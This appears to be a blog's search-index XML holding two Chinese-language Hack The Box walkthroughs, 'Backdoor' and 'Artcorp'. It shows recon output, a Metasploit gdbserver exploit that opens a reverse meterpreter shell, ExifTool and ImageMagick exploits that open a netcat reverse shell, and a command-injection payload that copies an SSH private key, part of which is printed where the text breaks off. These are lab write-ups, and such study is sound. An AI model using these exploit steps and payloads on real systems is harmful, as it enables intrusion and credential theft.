<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HTB Walkthrough - Backdoor</title>
    <link href="/post/HackTheBox-Backdoor.html"/>
    <url>/post/HackTheBox-Backdoor.html</url>
    
    <content type="html"><![CDATA[<h2 id="Recon："><a href="#Recon：" class="headerlink" title="Recon："></a>Recon：</h2><h5 id="Masscan："><a href="#Masscan：" class="headerlink" title="Masscan："></a>Masscan：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-15 01:20:37 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 22/tcp on 10.10.11.125                                    <br>Discovered open port 80/tcp on 10.10.11.125                                    <br>Discovered open port 1337/tcp on 10.10.11.125<br></code></pre></td></tr></table></figure><h5 id="Nmap："><a href="#Nmap：" class="headerlink" title="Nmap："></a>Nmap：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.125<br>Host is up (0.19s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)<br>|   256 aa:c9:<span class="hljs-built_in">fc</span>:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)<br>|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>|_http-generator: WordPress 5.8.1<br>|_http-title: Backdoor &amp;<span class="hljs-comment">#8211; Real-Life</span><br>1337/tcp open  waste?<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p>似乎有一些漏洞，但暂时不知道有什么用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; searchsploit wordpress 5.8.1<br>------------------------------------------------------------------------------------ ---------------------------------<br> Exploit Title                                                                      |  Path<br>------------------------------------------------------------------------------------ ---------------------------------<br>WordPress Plugin DZS Videogallery &lt; 8.60 - Multiple Vulnerabilities                 | php/webapps/39553.txt<br>WordPress Plugin iThemes Security &lt; 7.0.3 - SQL Injection                           | php/webapps/44943.txt<br>WordPress Plugin Rest Google Maps &lt; 7.11.18 - SQL Injection                         | php/webapps/48918.sh<br>------------------------------------------------------------------------------------ ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>目录名很标志：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>backdoor.htb<span class="hljs-regexp">/index.php/</span>blog/<br></code></pre></td></tr></table></figure><p>页面没有什么相关信息，链接都是官方小广告，在文章页面会有一个评论系统：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515093822557.png" alt="image-20220515093822557"  /><p>记住这里，说不定会用到，我尝试对目标路径爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">[09:36:57] 403 -  277B  - /.php<br>[09:37:40] 301 -    0B  - /index.php  -&gt;  http://backdoor.htb/<br>[09:37:43] 200 -   19KB - /license.txt<br>[09:37:58] 200 -    7KB - /readme.html<br>[09:38:00] 403 -  277B  - /server-status/<br>[09:38:00] 403 -  277B  - /server-status<br>[09:38:14] 200 -    1KB - /wp-admin/install.php<br>[09:38:14] 500 -    3KB - /wp-admin/setup-config.php<br>[09:38:14] 302 -    0B  - /wp-admin/  -&gt;  http://backdoor.htb/wp-login.php?redirect_to=http%3A%2F%2Fbackdoor.htb%2Fwp-admin%2F&amp;reauth=1<br>[09:38:14] 200 -    0B  - /wp-config.php<br>[09:38:14] 400 -    1B  - /wp-admin/admin-ajax.php<br>[09:38:14] 301 -  315B  - /wp-admin  -&gt;  http://backdoor.htb/wp-admin/<br>[09:38:14] 301 -  317B  - /wp-content  -&gt;  http://backdoor.htb/wp-content/<br>[09:38:14] 200 -    0B  - /wp-content/<br>[09:38:14] 403 -  277B  - /wp-content/plugins/akismet/admin.php<br>[09:38:14] 403 -  277B  - /wp-content/plugins/akismet/akismet.php<br>[09:38:14] 200 -  776B  - /wp-content/upgrade/<br>[09:38:14] 500 -    0B  - /wp-content/plugins/hello.php<br>[09:38:15] 200 -    1KB - /wp-content/uploads/<br>[09:38:15] 301 -  318B  - /wp-includes  -&gt;  http://backdoor.htb/wp-includes/<br>[09:38:15] 200 -    0B  - /wp-cron.php<br>[09:38:15] 200 -    0B  - /wp-includes/rss-functions.php<br>[09:38:15] 200 -    6KB - /wp-login.php<br>[09:38:15] 302 -    0B  - /wp-signup.php  -&gt;  http://backdoor.htb/wp-login.php?action=register<br>[09:38:15] 200 -   51KB - /wp-includes/<br>[09:38:16] 405 -   42B  - /xmlrpc.php<br></code></pre></td></tr></table></figure><p>访问install.php会被提示已经安装wordpress，然后会给我一个登录页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515094719086.png" alt="image-20220515094719086"  /><p>简单口令会报错，有个忘记密码的链接：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515094854023.png" alt="image-20220515094854023"  /><p>可以被用来枚举用户名。</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515095102986.png" alt="image-20220515095102986"  /><p>存在目录遍历，有大量文件，搜索会很消耗时间，我准备先放着，因为还要一个端口我不知道是做啥的。</p><h3 id="GNU-gdbserver-9-2-远程命令执行-RCE-："><a href="#GNU-gdbserver-9-2-远程命令执行-RCE-：" class="headerlink" title="GNU gdbserver 9.2 - 远程命令执行 (RCE)："></a>GNU gdbserver 9.2 - 远程命令执行 (RCE)：</h3><p>谷歌搜索了几分钟，我发现这可能是部署在主机上的gdbserver ，而且是有代码执行漏洞的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://www.exploit-db.com/exploits/50539<br></code></pre></td></tr></table></figure><p>虽然我无法确定它的版本，但我觉得试试总是不亏：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(multi/gdb/gdb_server_exec) &gt; show targets <br><br>Exploit targets:<br><br>   Id  Name<br>   --  ----<br>   0   x86<br>   1   x86_64<br>   2   ARMLE<br>   3   AARCH64<br><br><br>msf6 exploit(multi/gdb/gdb_server_exec) &gt; <span class="hljs-built_in">set</span> target 1<br>target =&gt; 1<br>msf6 exploit(multi/gdb/gdb_server_exec) &gt; <span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp <br>payload =&gt; linux/x64/meterpreter/reverse_tcp<br>msf6 exploit(multi/gdb/gdb_server_exec) &gt; run<br><br>[*] Started reverse TCP handler on 10.10.16.5:4444 <br>[*] 10.10.11.125:1337 - Performing handshake with gdbserver...<br>[*] 10.10.11.125:1337 - Stepping program to find PC...<br>[*] 10.10.11.125:1337 - Writing payload at 00007ffff7fd0103...<br>[*] 10.10.11.125:1337 - Executing the payload...<br>[*] Sending stage (3020772 bytes) to 10.10.11.125<br>[*] Meterpreter session 1 opened (10.10.16.5:4444 -&gt; 10.10.11.125:59136) at 2022-05-15 10:18:05 +0800<br><br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>完全可以。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 10693 created.<br>Channel 1 created.<br>python3 -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>user@Backdoor:~$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>user.txt<br>user@Backdoor:~$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>615482..........................<br></code></pre></td></tr></table></figure><h3 id="获取root："><a href="#获取root：" class="headerlink" title="获取root："></a>获取root：</h3><p>sudo -l 需要我输入密码，而我没有，在遍历SUID时，发现了screen：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@Backdoor:~$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/openssh/ssh-keysign<br>/usr/bin/passwd<br>/usr/bin/chfn<br>/usr/bin/gpasswd<br>/usr/bin/at<br>/usr/bin/su<br>/usr/bin/sudo<br>/usr/bin/newgrp<br>/usr/bin/fusermount<br>/usr/bin/screen<br>/usr/bin/umount<br>/usr/bin/mount<br>/usr/bin/chsh<br>/usr/bin/pkexec<br>user@Backdoor:~$<br></code></pre></td></tr></table></figure><p>这是一个窗口工具，我可以尝试打开一个root窗口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@Backdoor:~$ /usr/bin/screen -x root/root<br>/usr/bin/screen -x root/root<br>Please <span class="hljs-built_in">set</span> a terminal <span class="hljs-built_in">type</span>.<br>user@Backdoor:~$ screen<br>screen<br>Please <span class="hljs-built_in">set</span> a terminal <span class="hljs-built_in">type</span>.<br>user@Backdoor:~$ <span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br>user@Backdoor:~$ /usr/bin/screen -x root/root<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Backdoor:~<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>root@Backdoor:~<span class="hljs-comment"># cat /root/root.txt</span><br><span class="hljs-built_in">cat</span> /root/root.txt<br><span class="hljs-built_in">cd</span>.................................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Artcorp</title>
    <link href="/post/HackTheBox-Artcorp.html"/>
    <url>/post/HackTheBox-Artcorp.html</url>
    
    <content type="html"><![CDATA[<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Tue Jun  7 18:07:19 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt -T4 10.10.11.140</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.140<br>Host is up (0.42s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>80/tcp open  http    Apache httpd<br>|_http-title: Did not follow redirect to http://artcorp.htb<br>|_http-server-header: Apache<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br><span class="hljs-comment"># Nmap done at Tue Jun  7 18:19:42 2022 -- 1 IP address (1 host up) scanned in 743.04 seconds</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607182202676.png" alt="image-20220607182202676"></p><p>除了三个用户名之外都是假按钮。也没什么路径信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>200      GET       86l      263w     4427c http://artcorp.htb/<br>301      GET        7l       20w      234c http://artcorp.htb/assets =&gt; http://artcorp.htb/assets/<br>301      GET        7l       20w      238c http://artcorp.htb/assets/img =&gt; http://artcorp.htb/assets/img/<br>403      GET        7l       20w      199c http://artcorp.htb/server-status<br>[<span class="hljs-comment">####################] - 2m     90000/90000   0s      found:4       errors:334    </span><br>[<span class="hljs-comment">####################] - 2m     30000/30000   188/s   http://artcorp.htb/ </span><br>[<span class="hljs-comment">####################] - 2m     30000/30000   212/s   http://artcorp.htb/assets </span><br>[<span class="hljs-comment">####################] - 2m     30000/30000   236/s   http://artcorp.htb/assets/img </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H <span class="hljs-string">&quot;Host: FUZZ.artcorp.htb&quot;</span> -mc 200 -u http://artcorp.htb/ <br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v1.5.0 Kali Exclusive &lt;3</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : http://artcorp.htb/</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><br><span class="hljs-string"> :: Header           : Host: FUZZ.artcorp.htb</span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 215ms]</span><br><span class="hljs-string">:: Progress: [4989/4989] :: Job [1/1] :: 161 req/sec :: Duration: [0:00:31] :: Errors: 0 ::</span><br></code></pre></td></tr></table></figure><p>新域名有一个外链，点击后会跳转到一个页面：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607193850687.png" alt="image-20220607193850687"></p><p>上传图片会显示图片元数据：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220607194242503.png" alt="image-20220607194242503"></p><p>跟exiftool是一模一样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ exiftool kali.jpg            <br>ExifTool Version Number         : 12.41<br>File Name                       : kali.jpg<br>Directory                       : .<br>File Size                       : 26 KiB<br>File Modification Date/Time     : 2022:06:01 17:12:43+08:00<br>File Access Date/Time           : 2022:06:07 13:20:39+08:00<br>File Inode Change Date/Time     : 2022:06:04 19:26:31+08:00<br>File Permissions                : -rwxrwxrwx<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Resolution Unit                 : None<br>X Resolution                    : 1<br>Y Resolution                    : 1<br>Current IPTC Digest             : 84aa901aedb881ba9d6e719153213216<br>Coded Character Set             : UTF8<br>Application Record Version      : 0<br>Copyright Notice                : © GNULinux - http://www.redbubble.com/people/GNULinu<br>Image Width                     : 800<br>Image Height                    : 800<br>Encoding Process                : Progressive DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 1<br>Image Size                      : 800x800<br>Megapixels                      : 0.640<br></code></pre></td></tr></table></figure><p>尝试搜索一下该工具漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ searchsploit exiftool             <br>---------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                  |  Path<br>---------------------------------------------------------------- ---------------------------------<br>ExifTool 12.23 - Arbitrary Code Execution                       | linux/local/50911.py<br>---------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br>---------------------------------------------------------------- ---------------------------------<br> Paper Title                                                    |  Path<br>---------------------------------------------------------------- ---------------------------------<br>ExifTool Djvu Code Execution - Paper                            | docs/english/49881-exiftool-djvu<br>---------------------------------------------------------------- ---------------------------------<br><br></code></pre></td></tr></table></figure><p>确实有，但是不太好用，不过在github还能搜到另一个：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/convisolabs/</span>CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">22204</span>-exiftool<span class="hljs-regexp">/blob/m</span>aster/exploit.py<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python3 exploit.py<br>    1 image files updated<br></code></pre></td></tr></table></figure><p>将生成的新图片放上去。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nc -lvnp  9090<br>listening on [any] 9090 ...<br>connect to [10.10.16.8] from (UNKNOWN) [10.10.11.140] 47294<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ </span><br></code></pre></td></tr></table></figure><p>直接读取user.txt读取不出来，不过还有一个提权漏洞CVE-2020-29599：用pspy监听能看到会周期性执行convert_images.sh，在usr&#x2F;local&#x2F;bin目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">2022/06/07 10:00:01 CMD: UID=0    PID=870    | /usr/sbin/CRON -f <br>2022/06/07 10:00:01 CMD: UID=1000 PID=871    | /bin/bash /usr/local/bin/convert_images.sh <br>2022/06/07 10:00:01 CMD: UID=0    PID=875    | /bin/sh -c <span class="hljs-built_in">rm</span> /var/www/dev01.artcorp.htb/convert_images/* <br>2022/06/07 10:00:01 CMD: UID=0    PID=874    | /usr/sbin/CRON -f <br>2022/06/07 10:00:01 CMD: UID=0    PID=873    | /usr/sbin/CRON -f <br>2022/06/07 10:00:01 CMD: UID=1000 PID=872    | /usr/local/bin/mogrify -format png *.* <br>2022/06/07 10:00:01 CMD: UID=0    PID=876    | /usr/sbin/CRON -f <br>2022/06/07 10:00:01 CMD: UID=0    PID=877    | /bin/sh -c <span class="hljs-built_in">rm</span> /var/www/dev01.artcorp.htb/metaview/uploads/* <br>2022/06/07 10:00:01 CMD: UID=0    PID=878    | /bin/sh -c <span class="hljs-built_in">rm</span> /tmp/* <br>2022/06/07 10:00:01 CMD: UID=0    PID=879    | /bin/sh -c <span class="hljs-built_in">cp</span> -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf <br>2022/06/07 10:00:01 CMD: UID=1000 PID=880    | /bin/bash /usr/local/bin/convert_images.sh <br>2022/06/07 10:01:01 CMD: UID=0    PID=882    | /usr/sbin/CRON -f <br>2022/06/07 10:01:01 CMD: UID=0    PID=881    | /usr/sbin/CRON -f <br>2022/06/07 10:01:01 CMD: UID=0    PID=883    | /usr/sbin/CRON -f <br>2022/06/07 10:01:01 CMD: UID=0    PID=884    | /usr/sbin/CRON -f <br>2022/06/07 10:01:01 CMD: UID=0    PID=885    | <br>2022/06/07 10:01:01 CMD: UID=1000 PID=887    | <br>2022/06/07 10:01:01 CMD: UID=1000 PID=886    | /bin/bash /usr/local/bin/convert_images.sh <br>2022/06/07 10:01:01 CMD: UID=1000 PID=888    | pkill mogrify <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@meta:/usr/local/bin$ <span class="hljs-built_in">chmod</span> +x ./convert_images.sh <br><span class="hljs-built_in">chmod</span>: changing permissions of <span class="hljs-string">&#x27;./convert_images.sh&#x27;</span>: Operation not permitted<br>www-data@meta:/usr/local/bin$ <span class="hljs-built_in">cat</span> convert_images.sh <br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /var/www/dev01.artcorp.htb/convert_images/ &amp;&amp; /usr/local/bin/mogrify -format png *.* 2&gt;/dev/null<br>pkill mogrify<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@meta:/var/www$ mogrify -version<br>Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org<br>Copyright: © 1999-2020 ImageMagick Studio LLC<br>License: https://imagemagick.org/script/license.php<br>Features: Cipher DPC HDRI OpenMP(4.5) <br>Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib<br></code></pre></td></tr></table></figure><h2 id="flag-txt"><a href="#flag-txt" class="headerlink" title="flag.txt:"></a>flag.txt:</h2><p>运行者是1000UID，应该是thoam用户，我尝试根据漏洞信息制作payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;image authenticate=<span class="hljs-string">&#x27;ff&quot; `echo $(cat /home/thomas/.ssh/id_rsa)&gt; /dev/shm/0wned`;&quot;&#x27;</span>&gt;<br>  &lt;<span class="hljs-built_in">read</span> filename=<span class="hljs-string">&quot;pdf:/etc/passwd&quot;</span>/&gt; <br>  &lt;get width=<span class="hljs-string">&quot;base-width&quot;</span> height=<span class="hljs-string">&quot;base-height&quot;</span> /&gt; <br>  &lt;resize geometry=<span class="hljs-string">&quot;400x400&quot;</span> /&gt; &lt;write filename=<span class="hljs-string">&quot;test.png&quot;</span> /&gt; <br>  &lt;svg width=<span class="hljs-string">&quot;700&quot;</span> height=<span class="hljs-string">&quot;700&quot;</span> xmlns=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>xmlns:xlink=<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;<br>  &lt;image xlink:href=<span class="hljs-string">&quot;msl:poc.svg&quot;</span> height=<span class="hljs-string">&quot;100&quot;</span> width=<span class="hljs-string">&quot;100&quot;</span>/&gt; <br>  &lt;/svg&gt;<br>&lt;/image&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY----- <br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5 x7up3z5s/H/yujgjgroOOHh9zBBuiZ1Jn1jlveRM7H1VLbtY8k/rN9PFe/MkRsYdH45IvV qMgzqmJPFAdxmkD9WRnVP9OqEF0ZEYwTFuFPUlNq5hSbNRucwXEXbW0Wk7xdXwe3OJk8hu ajeY80riz0S8+A+OywcXZg0HVFVli4/fAvS9Im4VCRmEfA7jwCuh6tl5JMxfi30uzzvke0 